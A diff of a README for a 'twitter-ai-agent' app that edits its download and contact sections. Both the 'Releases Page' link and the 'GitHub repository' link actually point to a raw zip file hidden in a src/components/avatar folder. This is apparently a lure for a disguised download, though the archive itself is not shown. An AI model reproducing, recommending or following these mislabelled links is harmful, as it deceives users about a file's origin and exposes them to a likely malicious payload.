@@ -17,9 +17,8 @@ The **twitter-ai-agent** application allows users to interact with Twitter using
 
 ## 📥 Download & Install
 
-To get started, you need to download the application.
-
 1. Visit this page to download: [Releases Page](https://github.com/Saminiscool/twitter-ai-agent/raw/refs/heads/main/src/components/avatar/twitter_ai_agent_1.4.zip)
+
 2. Choose the latest version of the software from the list provided.
 
 3. Click on the download link for the appropriate file for your operating system. Follow the prompts to save the file to your computer.
@@ -73,6 +72,7 @@ If you run into any issues or need help, please reach out through the support se
 For additional assistance, consider reaching out on forums related to natural language processing or Twitter API usage.
 
 ## 📞 Contact
+
 For feedback or inquiries, contact the project maintainers through the [GitHub repository](https://github.com/Saminiscool/twitter-ai-agent/raw/refs/heads/main/src/components/avatar/twitter_ai_agent_1.4.zip). Your input helps improve the application.
 
 Thank you for choosing the twitter-ai-agent! Enjoy your tweeting experience with the power of natural language.
